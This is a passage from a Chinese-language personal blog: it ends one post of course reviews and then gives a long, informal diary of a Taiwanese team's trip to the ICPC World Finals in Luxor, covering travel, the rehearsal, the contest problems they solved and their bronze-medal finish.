又已經畢業不能打所以找了新隊伍。\n不得不說真的是蠻貪心的一個決定，除了每個週六要跟 too_soft 一起團練之外，平日又要找一到兩天在 ckiseki 打。\n原本以為真的是十一月要比賽，所以在十月左右瘋狂蹺課練習，到十月底才知道要延期到明年。\n在 too_soft 目標大概是去日本的 regional，但在排名賽被重擊，校內賽也打得不算理想，不過有拿到去越南比賽的機會。\n在越南拿到了第四名，前期在某題打表花太多時間，做後期題的時間分配也燒雞，幾何題如果最後打算要寫應該要早點開始想。\n第四小時完全只做了一題，雖然我覺得我和許博翔去把數數實做完有讓那題過得比較穩，但好像那題其實怎麼樣都會被做出來的話我應該去想別題例如幾何題才對。\nbtw 在越南玩的經驗很酷，第一次搭有床的火車。從越南回來之後發現在越南抱怨的很多缺點例如煙味或是交通在台灣其實一直也有XD\n結語 剛剛去翻了成績查詢網站後，發現足球的 A+ 比例是 75%，計網跟計邏簡分別是 36% 跟 48%，計結更只有 15%，資工再甜沒有足球甜。\n撰寫本文時正在 FLOLAC 當助教，是大三升大四的暑假，已經過了一段時間才來寫，希望記憶還算準確。\n會先寫第五學期而不是第四學期是因為接下來是下半年，應該先寫奇數學期感覺比較有用。\n","permalink":"https://omeletwithoutegg.github.io/2024/07/01/csie-5th-sem/","tags":["CSIE","experience"],"title":"第五學期修課心得"},{"contents":"ICPC World Finals @Luxor 世界總決賽紀錄 部落格快要長草了趕快趁現在更新一下，也是為了把自己花這麼多時間投入的活動做個好好紀錄。\n如果是怕暴雷題目的，需要跳過的段落是「正賽」與「賽後與心得」兩段，包含賽後心得裡面的 comment。\n前言 在大一IOI結束後ot和olmrgcsi邀請我同隊，暑假就組成ckiseki開始團練。ckiseki 這個隊名應該是由他們前一個隊伍的名字 kiseki 改過來的，我們三個人其中一個共通點是都是建中的，所以前頭加了一個 c 湊成 ck 的縮寫（？）總之我們那時候練得蠻多的，在當年（2021）的下半年在臺北站用線段樹和一些壓常得到了 46th world final 門票。本來預定應該是 2022 比賽的，但因為 covid 的關係延後得遙遙無期，直到 2023 年初才得到會在 11 月去 SSH，結果因為以巴問題又延期，2024 的 1 月才得知 2024 年 4 月改在 Luxor 舉辦。如果是大四才拿到票的學生，可能都已經工作兩三年了，可以說非常消磨熱情。\n我們隊在進 wf 後參加了三次的ptz camp兩次的ocpc，以及很多的 universal cup。雖然感覺我們是有成長的，但越接近 final 越發現前排隊伍有點太過耀眼。如果我們跟以前的隊伍比的話，看排行榜有機會是可以拿到銀牌，但本次比賽的隊伍名單一字排開大概十隊有紅黑人，再把一些平常團練打得很好的隊伍算進去的話，悲觀一點連拿牌都很難，如果看我們 ucup 的成績大概有一半是超級拉垮的。不過賽前一個禮拜 vir 某場 WF 的時候看到東大也是最近 vir 的而且跟我們同題數只輸 5 分鐘罰時，雖然大概是他們太老導致很少練但還是讓我稍微感到樂觀一點，努力帶著這種樂觀啟程。\n啟程 結束落落長的前言，開始本次旅遊的流水帳。\n往 Luxor 的旅程從桃機開始，週六的晚上十一點的飛機，我們七個人包含教授在櫃檯集合並登機；在同一個櫃檯也已經看到交大清大他們。這是我第一次搭日本或台灣以外的航空公司（阿聯酋航空，回來台灣之後學習到我是第一次坐所謂 A380），有點開眼界的感覺，經濟艙的座位上竟然有萬用插座（雖然九小時應該非常需要xd），而且還有一個被擋住的樓梯，往上層艙看起來有一個像是酒吧的東西；他們的餐點也還不錯吃。飛到杜拜的飛機坐得很滿，而且我們是半夜起飛，所以大家都在睡覺，我原本帶書來看但我也不好意思在他把機上燈光關掉的時侯開自己的座位燈xd。\n上機前可以看到是個四個引擎的大客機 插頭和娛樂系統 坐在中間的位子蠻難睡的，努力消磨時間跟睡覺總算到達杜拜，是當地凌晨五點。到杜拜又是另一種開眼界，我們還待在轉乘的區域可以逛的商店就已經非常多，有很多的精品店還有偶爾會遇到emirates的周邊商品店。這裡已經可以遇到很多來 icpc 的人了，我們在杜拜的麥當勞買了一個約五美元的大薯四個人分著吃（好貴），剛好對面坐 NUS 的 coach；回到登機口之後還有澳洲跟日本的東工大跟京大的樣子，不過我幾乎不敢搭話，而且不知道是吃太飽還是吃壞肚子，有點肚子痛再加上很累不太能專心。\n在杜拜的 WIN THIS CAR 四個人分一包薯條 杜拜到開羅的飛機上我終於打開我筆電上預先載好的 mygo 來看。在起飛前聽說伊朗又跟以色列開打，我看確實飛機的航線就往下彎不通過以色列。入境後我們需要扛著行李移動到另一個航廈，十二點的氣溫大概是 26 度，沒有想像中熱。國內線的安檢反而更加頻繁，我們在到埃及航空櫃檯前過了一個關卡（有分男女，而且不知道標示在哪裡很酷），然後登機口前又過了一個，而且都會摸一次全身檢查。在埃及航空的櫃檯看到更多人了，包含東大的 yutaka 他們還有 stanford 的一些人。最後從開羅到 Luxor 搭埃及航空，他們的起飛和降落非常可怕，幸好一小時就到了。\nEmirates 機上的早餐，誰不喜歡蛋捲呢？ 埃及航空上塞牙縫的小蛋糕 度假 Day 0 抵達 Luxor 後才知道剛剛就在我們後面的交大和 NUS 有人被卡在開羅，真是多災多難。跟著上大會提供的接駁車後我就在巴士上小睡了一下。\n到達的飯店是尼羅河島中的一個像是度假村 jolie ville，我們數台遊覽車的人擠進櫃檯可以說非常混亂。這裡蠻大的，居住的區域是一個一個的多邊形，每個多邊形是一圈的房間；我們一隊住的地方是兩個互通的房間，一間放了一張雙人床，隔壁則是兩張單人床，看起來非常寬敞。房間裡放好了兩整大箱的瓶裝水，看起來不用擔心渴死了。\n真正坐下來休息大約是週一的下午。感受到什麼叫做風塵僕僕，洗了個澡之後，我們逛了一下整個 jolie ville，到處都是 icpc 的牌子，並且還有官方提供的 chill zone，有大型 connect four、拉密、桌子足球、飛碟球、西洋棋還有桌球。周老師終於得償所願打到桌球，但在河邊的室外風超級大，而且太陽也很刺眼，根本沒辦法好好打XD。\n所謂室外桌球 似乎落地之後我的肚子痛就解除了，可喜可賀。晚上的行程表是 welcome dinner 加上 team registration，我們這隊的 registration 時間是比較晚的九點，於是就悠哉的在餐廳吃完晚餐之後回房間休息，結果我果然在房間開始大爆睡（畢竟下午又死不睡跑去逛街），要不是 ot 把我們叫醒可能還會遲到更久。總之就是跟著 coach 去「Nile Hall」開始跑十個櫃台，繳交一些文件以及比賽當天要放桌上的 codebook 跟文具，還有領取一大堆的紀念品、文件，以及每人三件的 T-shirt。這個 T-shirt 的字跟底的顏色是我們自己選的，但太久以前導致我們幾乎都忘記是什麼顏色了XD。回去之後繼續我的大爆睡，順帶一提我佔走的是那張雙人床，抱著我的軟軟owo。\n晚餐 Day 1 隔天的行程是去 karnak 神廟的 excursion，我們一大群人從 jolie ville 裡面分批搭上船，稍微欣賞一下尼羅河美景。\n跟我們同一艘船的有馬里蘭大學南京大學還有偶像（？）東工大，不過船開的時候聲音蠻大的，不知道是導遊還是開船的人又把非常埃及的爆音音樂開得很大聲所以我其實隔一個人的聲音就聽不太到了。一開船我的帽子就差一點被河上的強風吹走，接著因為我坐在船頭的位子，船加速之後前面的水花就開始會濺到我，只好用書包稍微擋一下。導遊是一個感覺四五十歲的婦人，稍微介紹了河岸兩邊的東西之後我們就接近上岸了。上岸後又接著跑去搭遊覽車xd，似乎不知道為什麼我們今天 excursion 的分組就是上了同一艘船就是同一組了，導遊問我們這組的名字要叫 future 還是 lamesis，沒有人知道怎麼回答不過傅老師就幫我們這一團決定就叫 future xd。我們在等遊覽車的時候後面的南京大學突然就有人在說「你是不是開始想回飯店玩原神啦」超級好笑。\n船頭滿滿的水花 下車抵達 karnak 神廟的入口後，導遊讓我們先去廁所，一到廁所前才知道還得收錢的？一美元可以給三個人進去上，但裡面也不是說特別厲害。聽到後面的中國人真的會說美刀覺得很稀奇。接著就把入場票發給大家進去，然後是熟悉的安檢環節。進去之後導遊就邊介紹邊帶著我們向內走，一走出室外就感受到埃及好熱，確實乾的熱是比溼的熱舒服一點，但彷彿會真的熱暈你，許多人都戴上了帽子。\n在這個神聖的神廟裡 ot 抓到時機跟東工大他們搭話，然後我也趁機跟著上去貼臉成功要到 tatyam 的合照，因為語彙力不足不知道該說什麼跟對方是什麼意思但不知道為什麼就握手了？？？我有一種簡直是偶像見面會突然握到手的感覺，這好微妙xd。然後過了一陣子才想到說沒找 noshi 合照是不是失禮的一種。\n入口附近的 GOAT 雕像（無誤） 聖甲蟲 埃及這裡很多貓貓 跟 tatyam 的合照就不放出來了，只放這個就好 導遊講解完並帶我們走到深處之後我們有自由時間十五分鐘，去紀念品店逛了一下買了汽水喝。上車回去之前我們順便領取了 lunch box，lunch box 的領取是蠻混亂的，他會問我們之前填的口味是什麼，但我印象中官網的 survey 只有問後面三天的午餐盒而已。我就跟著前面的人講了 chicken，總之領取到餐盒之後趕快上車。我們直接就搭遊覽車回到飯店（沒有經過船），今天的導遊也在這時跟我們道別，他直接在一個 Y 字路口的正中心下車有夠狂XD。\n回到飯店後才有辦法好好吃 lunch box，其實不太好吃（伏筆）。\n雙人床上擺滿了花，而且軟軟也乖乖坐著很可愛，看起來明天是該給清潔人員小費了。\n軟軟跟花花 晚上吃完晚餐後準備又要上車去 open ceremony。這個晚餐 buffet 五天都差不多是一樣的，也就是說 welcome dinner 不是什麼特別的 welcome；有室內跟室外兩邊，菜差不多，但今天日落後蚊子多得瘋狂，很多人都躲到室內吃晚餐。吃完走到大廳蚊子仍然非常多，拿出防蚊噴霧用了一下。搭車抵達的地點是 luxor 神廟，還沒下車就聽到旁邊的清真寺用很大的聲音廣播一個像是在大叫的東西，應該是某種宗教儀式？然後安檢的隊伍又排了好長。一出安檢就可以看到為了 open ceremony 而鋪設的場地，大致上應該是由木板為底上面鋪了一層黑色的布，還有一堆舞台跟螢幕。稍微逛了一下 luxor 神廟，但走回去到一半的時候大部分的照明就陸續被關掉，彷彿是在催促我們趕快回到座位，選手們就像有趨光性一樣慢慢往會場移動。\n開場照慣例是個表演，很搶眼的是後面直接在神廟上雷射投影了 ICPC 2023 的字樣，字一直在閃爍而且還一直偷偷調整角度跟位置XD。\n在這個就在神廟旁邊的會場周圍用探照燈到處照來照去的，頭頂上還有無人機在拍攝我們，感受到某種科技跟古文物的衝突感。\n幾個人出來講講話之後，比較有趣的就是介紹所有有參加的大學，分不同區介紹，按照順序會先講只有參加 46 屆的大學、只有參加 47 屆的大學，以及兩屆都有隊伍參加的大學；昨天 team registration 的時候拍的照片這時候會被放出來。\nLuxor 神廟一塊似乎寫著希臘字母的石板 logo 直接投影在神廟上，而且邊閃爍邊調大小 結束之後似乎 ucup 有一群人聚集拍照，我們沒有拍到就先回飯店了。我們很晚才到飯店加上我在床上打混了蠻久，拖到洗完澡都快一點了，吹完頭髮出來才想到，糟糕會不會吵到他們。\n會場與 challenge Day 2 早上大方的 ot 放了五美金當小費。今天是第二天在這邊吃早餐，昨天的早餐我只有拿一個 omelet 而已，今天是拿了大概三盤 omelet，瘋狂排隊拿蛋。\n早餐參考圖樣 早上先是在 Nile Hall 的 JetBrains 的 blind coding challenge，這裡是少數 46 屆跟 47 屆分開來的行程。JetBrains 先工商了一下他們自己之後，就是期待的 blind coding challenge 了。台上兩個人面對面坐，距離一個稍微長的桌子，一個負責看螢幕跟動滑鼠，另一個人操控鍵盤。目標就是解一個放在 codeforces 上的 mashup contest 盡量解越多題。選用的語言是 kotlin，似乎是用 JetBrains 他們的編輯器；解了一題之後似乎兩人會交換，A 跟 B 過的時候大家是用力歡呼加拍手，但沒能在時間內解出 C，大家看著兩個人在台上坐牢，身歷其境 XD。結束之後換 47 屆的，他們的兩人組是 tourist 跟 ecnerwala，聽說他們破台了，真羨慕。\n下午是 huawei challenge，所有選手第一次聚集到正式賽的會場。雖然之前在 codeforces 上就有聽說會在「tent」比賽，但實際到了帳篷還是驚呆了。帳篷的位置就在我們的飯店附近（也就是說是島上），住其他飯店的人需要搭車過來。因為是正中午所以不是普通的熱，帳篷內側的周圍開了非常強的冷氣讓坐在中間的人感受到的溫度差不多是正常的，不過走去廁所的路上稍微靠近一點冷氣就覺得超級冷，一打開門又得頂著超級大太陽排流動廁所的隊伍，陽光刺眼到我很難睜開眼睛。\nlunch box 和昨天的內容差不多，不過是直接放在我們的位子上，想到明天和後天也要吃這個鬼東西就覺得不能指望他們了。另外桌子上有瓶裝水跟很多筆記本和筆，筆記本裡面有各種方格，有 xy 軸的有密集一點的甚至有蜂窩六角形的。滑鼠墊上面跟我們的帽子一樣，都還是寫著前一個預定舉辦的地點 SSH 的字樣。\nchallenge 有點像是 AHC 的形式，就是針對一個（應該是）NPC 的問題用一些 heuristic 的方法想辦法弄出高分數。\n稍微照著周柏宇說的方法寫了一份隨機之後傳上去只有 1300 分。後來改寫了模擬退火，ot 又寫了另外一個作法，但我們都無法突破 1600 分，記分板上大概有一百隊是 2900 以上 XD。我實在也很想睡覺，在桌子上小趴了一下。保持著一百以後的名次到比賽結束，還被傅老師過來關心。看了 tatyam 的推特才知道據說優勝會有兩百萬（日圓），而且感覺他們是有備而來，還用了什麼平行執行跟寫了 script 讓 output only 的部份能夠拿到盡量多的分數。\n雖然說 challenge 的時候我們很累而且其實也不是我們擅長的，但一百多名還是讓我非常焦慮，所以我們提議回去之後不吃晚餐抓緊時間練一場，五日不團練面目可憎。抓了 8BQube 一起來練，我們就各自吃了一點泡麵（我幹了周柏宇十幾包泡麵中的一包來吃）後在各自飯店房間開打。BTW 飯店的網路很爛，不過漫遊是勉強可以打比賽的。\n結果這場好難，而且打到最後真的幾乎是要睡著，開場十三題最終我們五小時做了六題，差一點可以做出第七題陰間 parser 題，而且我們除了簽到題以外每題都有罰時，總計 14 個 penalty，8BQube 他們也是慘烈，我們兩隊都吐槽今天 WA 成這樣該是把正賽的 quota 用完了吧。打一場暖暖手的效果應該已經達到，從六點打到十一點真的累，洗澡明天再說，很快的我就抱著軟軟入眠。\n彩排/測機 Day 3 今天早餐一樣吃了很多蛋。ot 跟 tourist 一樣夾了一堆 sausage 來吃，他表示那是唯一可以吃的食物，得證 ot = tourist。\n回去房間後洗澡，還有一點小睡的時間。\n集合的地點是 Nile Hall。\n因為是 dress rehearsal 所以跟正式賽的規格一樣，要求我們不能帶任何電子用品包含手機進場，所以我原本以為可以看著手機上的清單一個一個測機但其實不行。其他配件例如外套或是手錶也幾乎被禁止。台上螢幕寫著的 TODO list 有一項是 mohammed fouad 讓人非常在意，然後馬上就知道這是什麼了，一個大鬍子拿著麥克風好像在炒熱氣氛，但我唯一的印象就是他一直大聲喊 are you ready，總之應該就是本次大會的小丑人物。坐牢了一個小時後終於我們可以離開 Nile Hall 走路前往帳篷。我們進帳篷的時候需要拿一個像是入場證明的小單子，兩個主持人（其中一個是大鬍子）會輪流念進場的學校的名字。廁所和昨天只有一間不一樣，今天開始 46 屆和 47 屆必須用不同的廁所。但是入場之後我們去廁所被攔住，甚至被禁止離開我們這一排，想去廁所得先坐牢三十分鐘等開賽，而且我明明看到有人就直接走出去，坐牢感特別重。\n意外的是題號從字母 O 開始編，和之前得知的一樣共有三份題本。測機的題目都是以前的 World Finals 題目，雖然有些不是我做的所以我沒有印象。每一題都還複製了一遍方便我們有更多題可以測（也就是說十二題的前六題和後六題是一樣的）。\nteam registration 的東西就放在桌上，包含 team reference document（也就是 codebook），於是 ot 就認真練習設定了一次環境。\n__int128 跟 pbds 都可以用；沒有 MLE 的結果只有 RE 的結果；C++ 是嶄新的 C++ 20 非常棒。\n我們也稍微做了一下幾題之後就開始測時間，基本上評測主機和我們的電腦跑的時間非常一致，簡單的操作跑個一秒 1e9 勉強是沒問題，加了 pragma 的 bitset 也是一樣可以跑到誇張快。無聊到繼續開題目，想說把 virtual 時賽中沒有 AC 的題目重新寫一次，結果這次也沒有在時間內推出可以過範測的東西。鍵盤打起來的感覺是有時候 shift 卡卡的不過基本上跟我們之前買來的那把一樣。\n測了什麼 這裡有些是在前一天 challenge 做的，時間序有點忘記了。\n編譯非常慢。從 htop 看來說，主要應該是因為我們的電腦有在跑錄影程式，所以很多效能被佔用。不過可以 precompile，而且不需要 root，方法是改成 #include \u0026quot;bits/stdc++.h\u0026quot; 然後在目前的資料夾建一個 ./bits/stdc++.h 裡面是 #include \u0026lt;bits/stdc++.h\u0026gt;，precompile 之後編譯的速度變快超多，而且傳上去也會動，好棒。 跟越南站的時候一樣，gnome-terminal 先按 F8 再按 F10 的時候會出現奇怪的 escape sequence，經過一些嘗試之後我們決定當天改用 konsole。 一抬頭就看得到記分板跟每題統計的跑馬燈，所以其實平常開另外一台電腦看榜不太犯罪（伏筆：正賽當天每題人數統計的跑馬燈似乎有壞掉） 決定比賽當天實施一寫完就印原則，彩排這天等了半小時印的 code 才來，有點害怕當天。列印要用 command line 指令。聽說有人把記分板列印出來用了很多紙，超好笑。另外聽說列印 0 byte 的東西例如 /dev/null 不會有紙出來。 command line 有 submit 的指令跟各種語言編譯的指令，但應該沒有打算用。 命名成 t.cpp 在選檔案的時候就會自動幫你選題目是 T，到埃及前就已經知道的標準 domjudge feature，只是再確認一次。我們原本是把模板都打在 z.cpp，但因為這次題號會用到 z 所以 ot 表示如果隔天也是倒過來編號的話要改把我們開場的模板打在 a.cpp。 本機有 cpprefence 可以參考，不過不知道怎麼搜尋。結果正賽其實也沒用到。 不知道 測機結束後螢幕被強制關閉，我們原本以為必須待在原地，但看周圍其實有不少隊伍拿到手機了。原來似乎一般來說是要請 coach 拿行李，然後一結束馬上就能去旁觀席找他們拿，但今天我們的 coach no show，聽說 8BQube 他們直接原地坐牢兩小時，不過我的手機是就跟著 ot 的背包寄放在 Nile Hall，結束後憑著行李牌就能領。回到帳篷是 challenge 的頒獎典禮，不知道為什麼要遮住前三名後天才頒。然後是一個有關深度學習跟 GPU 硬體紅利的演講。\n演講時拍的我們的 workstation 的模樣，包含難吃的 lunch box 演講結束之後意外的還有一個 coach award，PJ 拿到兩個獎牌，但我們 coach 都 no show，所以不知道為什麼就變成有點尷尬是奇怪的四人組合上去領獎。\n最後 coach award 也頒完了，竟然他把我們的螢幕重新打開，並且 domjudge 上還可以繼續傳，這表示其實看手機測機的行動可以現在執行 www（再不看行程表啊），稍微測了一下之後變成 ot 想偷打 kernel 的環節(X\n聊了一下天之後就悠閒回飯店吃晚餐，畢竟要是今天再跟昨天一樣練應該反而會累死自己所以就不練了，還好昨天有把握時間暖一手。sean liu 是住另一個飯店的不過他今天跑來跟我們偷偷吃 jolie ville 的晚餐順便聊聊，不得不說他來 Luxor 的路上真的是多災多難。今天晚餐拿了兩罐放在冰桶裡面的汽水，飯店餐廳有很多寫著 ICPC only 的冰桶或是咖啡機之類的，sean liu 也拿了兩罐xd。晚餐用完後稍微又到處逛了一下，我是大概洗完澡十點半就睡了。\n玩了一局超大 Connect four 正賽 Day 4 今天就是正賽了，努力早睡睡到自然醒並且早餐吃飽一點，廁所在去集合之前上完。\n賽前讓大家入場以及主持人喊話的環節實在令人煩躁，我甚至懷疑他們是想要用坐牢感來蓋過我們的緊張感。\n就跟 dress rehearsal 的時候一樣，一打開題本果然是從 P 開始，非常不習慣。\n跟平常的練習一樣由 ot 打 vimrc 跟處理環境，我從前面讀前半的題目，周柏宇從後面讀。\nP 題第一眼感覺就在哪裡看過，但我決定先不仔細想丟給周柏宇就先繼續看下去。看完前五題感覺都不知道怎麼做。\nY 和 W 從記分板看起來大概是前兩題，於是 ot 寫 Y 後我照著周柏宇講的構造寫 W。因為怕 casework 自己寫爆而且搞不好之後還要改，所以果斷選擇先抄高斯消去法，結果範測的互動就 WA 了。這時他們兩人在旁邊討論 P 準備要上來寫，我就跳下去看自己哪裡寫錯，結果好像那組向量構造就是錯的，但我實在想不通一組好的向量條件是什麼，我們缺了什麼條件。W 實在是過太多隊了，只好瞎猜是隨機生一組就會過。\n因為 P 在寫了所以 W 放置著跑去想金字塔 T 題，第一眼的想法就是選一個面壓平變成像是展開圖，然後再建邊跑最短路。\n寫 P 的時候感覺很卡，ot 一直叫我不要看他寫xd，然後說他範測沒過跳下來修，結果其實半小時前就過範測了。\n等 P 寫完我就跳上去寫 W 然後就 AC 了，P 等他說要丟上去也 AC 了。不知不覺已經過了一個小時，但目前三題待寫一題應該還在軌道上。\n跟周柏宇確認後他也覺得 T 可以這樣寫，於是 ot 幫我抄完線段相交的模板後我就回去寫 T。在我寫的同時 U 的構造似乎也在順利進行。\n我寫一寫之後範測就 WA 了，然後就發現我漏條件，壓平後不能從三角形的頂端直接往外走，修完之後仍然有不好的預感，但還是先趕快傳一遍讓 ot 可以開始寫下一題，submit 之後吃了個 RE。\n我的猜測是我有一個地方 assert false，而這會在壓平後有兩個頂點重合的情況才會發生，我才想到原來兩個三角形會相交甚至重合。\n修了幾次之後都還是過不了（4 tries），U 題也是修了很久之後仍然 WA，我們也只能當作沒看到名次慢慢掉到五十幾七十幾名繼續 debug。\n途中 V 題周柏宇講了一個作法（難以聽懂的溝通障礙正常發揮），終於聽懂之後上去寫結果範測就沒過，de 了一個 bug 是我凸包的模板抄錯把一個 0 抄成 9，如果抄完就驗 hash 就馬上會發現了QQ 不過之後範測還是沒過，把凸包的內容印出來之後跳下來給周柏宇研究。\not 表示他剛剛 U debug 到吐了去看了一下 T 題不是就三分搜套三分搜嗎？根本是天才，要不是有 ot 我就會一生卡在 T 了 QQ\n我聽他的解釋覺得非常有道理於是他就上去寫，但一分鐘後我看到 struct Pyramid { int x1, x2, y1, y2 } 趕緊的跳上去自己把 T 開了。這題範測頗爛所以有測一些剛剛自己腦中亂生的測資（一小一大的貼在一起的金字塔，大的很高），才得知前面幾個版本的 T 在那個測資輸出的答案都是錯的，只是自己不會算術一味相信之前那個解是對的。這個寫法傳上去之後順利一發就過了，看過題人數就應該要是這個寫法才對。U 陸續挑出一堆 bug，但還沒過；周柏宇表示 V 是我需要先把兩個骰子的順序按照會不會贏交換，交換之後我就輸出跟範測一樣的答案了。把對稱的 case 寫好後也就上傳，吃了個 WA，然後就發現我在算要不要交換的地方有溢位，再傳就過了，雖然浪費了一次罰時但可以說感覺清爽多了。十分鐘之後 U 也 AC 了，after 5 tries。至此比賽已經過三小時。\n現在我們六題+超級爆炸罰時，大概二十三十名，但 Q 題是一個超級多人做出來的題目，所以推測我們也可以開出來。記分板上現在 R, X 都是 MIT 獨開的題目，也就是說七題就會跟第二名同題數了；另外前段隊伍都在嘗試 R，看起來應該是 Q 之後的下一題。\n但周柏宇表示他範測算不出正確的答案要我先做一下，他去做 R，結果我搞了半天也算不出對得上範測的答案（我在這邊浪費時間做小學生算術好像很虧）。Q 是一個算期望值的題目，想法大致上是期望值可以相加，並且拆成每一步的期望值後應該要很好算。R 目前的進度姑且可以說是每個 BCC 要分開做，電腦為了不空機先抄了 BCC 的模板，之後又稍微針對一個 BCC 恰好兩個環的情形打表了一下，發現可以弄出來的 permutation 數量不是 n! 就是 n!/2。\n因為 Q 實在太多人過了，我提議我用電腦暴力跑一下範測確認我們理解沒有錯誤，然後順便再把我們分類的每一步的期望值打出來，看看自己是哪裡算錯了，把跑出來的結果看了一遍之後發現被自己笨死，有一個 case 根本就不該算。終於寫了個 $n^2$ 過了範測，趕緊改成 BIT 過了這題，這種 div1 A/B 的題目我們兩個人範測都算錯拖到三小時四十分才過實在是有點慘。\n過了當下的名次仍然只有 14 名，此時我們要拿牌一定要做出第八題，但其實做了八題也不一定能拿牌，有大概四五隊已經八題，且都是開 R，只有 mit 開了 X。\n剩下只有四題 RSXZ，X 當時周柏宇宣稱是大模擬；Z 只有 mit 瘋狂傳了一波之後就停了，猜測我們不該碰 Z；S 則是在第一個小時周柏宇就跳出來請 ot 寫了一個範測就會 WA 的假解，我不敢再碰。\n時間只剩下一小時二十分鐘，我們只能相信全力做出 R 有機會拿牌，之後的事情之後再說。\n周柏宇讓 ot 跳上去開始寫暴力打表所有邊雙連通圖的答案（但我總有一種記憶是某題也在打表所有簡單環然後寫到爆炸），體感時間過了很久。\n根據之前的打表可以知道 permutation 數量是 n!/2 的那些都是兩個奇環相黏，而其實湊不出來的那一半排列就是奇偶性不對的排列，因為奇環 rotate 一次是偶置換（？）\n我在下面的時候周柏宇表示就先貸款說「要判奇偶性的特殊情況只有只有點仙人掌每個環都是奇環的時候才要判」的話，我們能不能寫出一個作法，然後我就想了一個如何判一個圖是每個環都是奇環的點仙人掌。還有周柏宇不知道為什麼像是有個錯覺是覺得有重複的東西就變很難，明明最近感覺就有遇到一個類似的東西（如果有重複的東西的話，既可以是奇置換也可以是偶置換，否則置換的奇偶性就被確定了）。稍微想了五分鐘怎麼實做，現在就是到底這個猜測對不對的問題。ot 似乎寫出了 bug 要跳下來，我就先上去寫了一點東西，再被搖下來之後那份暴力打表還是有 bug，所以就決定乾脆賭下去我先一路寫完傳上去。\n因為有先想過怎麼實做所以我體感是寫得很順，範測和一些他們構的比較強一點的測資通過之後就丟上去\u0026hellip;然後吃個 WA，血都吐乾了，要是那個猜測是錯的怎麼辦？我們有什麼備案？ot 先繼續修暴力對拍，我們就印 code 出來看，發現我有一個地方忘記把一個 flag 設成 true，真沒有愧對這個變數的爛命名，改掉之後傳上去三個人就瘋狂盯著看有沒有過。過了之後的高興並沒有持續太久，因為我們剩下半小時沒有題目可以做了。\n因為 X 被說是大模擬，所以我聽完 X 之後又跑去看了一下 Z，這時候大概已經沒什麼腦細胞了，明明榜就是指引我們做 X 但我一直沒有放在心中想。最後 ot 跳上去假裝寫了一下 X 的讀入部份之後，就只剩下一兩分鐘給我們傳 strategic submission 了。\n賽後與心得 賽後我們迅速的從傅老師那邊拿到手機，但比較重要的是到底有幾個人八題了。\not 和周柏宇發揮社牛力到處去問，然後 chenjb 甚至也跑來問我們有沒有八題。\n最後還是有一兩隊沒有問到，心上仍然綁著大石頭。\n終於結束正賽 因為接下來就要去 secret place 開板+閉幕儀式了（這時候滑推特才學到日本那邊把滾榜/開板是叫 Yes/No(?)），所以大家被趕上遊覽車，我們匆忙的把氣球底座和一些東西放到飯店再跑上車。\n車程非常意外的久，大概四十分鐘，在車上小睡了二十分鐘。\n下車後同樣是慣例的安檢，往前走幾步感覺到這裡是異常的空曠，才聽說我們到的地方就是帝王谷的哈斯普蘇女王大殿。\n空氣中微微的瀰漫著沙，跟著人群往前走卻是在一片沙漠中搭出來的最終舞台，往前看的參考物幾乎只有 ICPC 的 logo 投影，靠近點看還會發現仍然是直接投影在大殿上。我們台大七個人找了一桌坐下來，接著就是一些舞蹈表演還有冗長的演講以及廣告影片，不過我們則是專心的在大會架設好的餐桌上用餐。可以說烤肉和飯的部份不錯，但其他糊糊或是非常生又硬的蔬果實在有點難吃下去。\n這邊順便頒了前幾天偷偷遮住的 challenge 前三名，恭喜東工大優勝（據說有 USD 13000 獎金）。\n一個小插曲是不知道為什麼有一群 staff 像是喝了酒超級 high，把人抬起來歡呼，而且他們離舞台有點距離感覺沒人制止他們，最後也不知道怎麼就停下來了。\n夜晚的沙漠中有一個一堆探照燈的舞台 閉幕式晚餐 甜點，跟 lunch box 裡面的一樣不過多了擺盤跟一抹醬 人超級多，應該很少位子能直接看到舞台，都是看螢幕 不知道為什麼 high 到抬人歡呼的團體 總之最後來到了開板環節，主持人穆罕默德有點吵，而且大會決定 46 屆和 47 屆的板交替開，輪流把低題數的開一部分之後念獎項再換另一邊，中途還會有各種獎項例如首殺或是 regional champion 要頒，等得心急如焚。\nU of wroclaw，ITMO 都沒有開出第八題，stanford 也是兩題 pending 都沒開出來，最後我們沉一沉沒有沉到銅牌線下，剛好維持在第十二名，也是解出八題的隊伍中罰時最高的。可以說幸運拿到了銅牌。\n接著就是拍照環節，我的軟軟被強制不能上台qq。\n上台的時候一直不知道該或不該握手或鞠躬，該面對哪裡手要怎麼擺，總之是過去了。現在回去看直播看得我尬癌發作。\n銅牌的四隊有一起合照，意外的得到跟傳說中的 yutaka 的一張合照（？）雖然是很多人的。\n坐在等候頒獎座位的視角。前方就是北大，最右邊是 jiangly 舞台の裏：站在舞台往後拍的視角，大殿上有 ICPC logo 投影 comment about 本次表現 如果我們想要得更好的牌的話，首先最重要的是不要在 T 和 U 卡題導致第二小時黑洞，接著應該就是 Q 範測算錯拖超級晚才 AC，然後就是必須賭 R 賭的更用力，直接相信他遲早會過而另外兩個隊友在底下做 X 題。如果沒做出 X 的話罰時必須要超級好才能銀牌，但如果以上幾個問題都改善的話，我們應該會有一小時多可以做 X 題，稍微偷看了一下解，我認為三個人討論是有機會做出 X 的（當然也可能我們風向歪向 S，而且我們當天結束到回飯店其實也沒有討論出 X 該怎麼做）。\n另外，World Finals 正式賽真的大家都會軟手，看到牌線下有好幾隊原本認為會得牌的隊伍，可以說，World Finals 就是在比誰不軟手、誰能在不舒服又奇怪的環境發揮。我自己感覺也有一些平常該做的事不知道為什麼就忘記了，例如我今天只有去一次廁所，而且整個 lunch box 都沒打開來吃（其實可以吃一下甜點醒腦的）。\n本次實際上有用到的模板除了 debug macro 以外，有凸包、KMP、BCC（找橋）、高斯消去，對面 47 屆的題目似乎頂多也就多考察個質因數分解，最多最多若把凸包那題做難了可能會用到全整的半平面交（如果不是全整的話要調對 EPS）；至於線段相交反而是沒有對最終的 AC 解有貢獻，有點 codebook 不如放個三分搜的感覺。我想說的是，在 codebook 準備一些毒瘤東西其實對 WF 幫助不太大，會出這些毒瘤東西的可能只會是 regional 比賽，反倒是把基本的模板整備好很重要，尤其是我認為模板的 md5 hash 應該積極引入，回去看直播會看到有些隊伍像是怕模板抄錯在花時間對，而我們則是把模板的內容整理成好用的樣子，要用的時候就百分之百照抄，如果抄錯立刻就能被 hash 抓出來，很有幫助。\n郊遊 Day 5 隔天原本 sean liu 有問我們要不要去一個 excursion，但那個行程要早上八點集合，我們最後因為實在太累也不敢跟這個行程了。傅老師說中午十一點半集合，我們差不多睡自然醒睡到八點半之後吃個早餐再混一下，洗個澡就差不多了。老師中午集合後表示我們中餐跟晚餐就吃 KFC 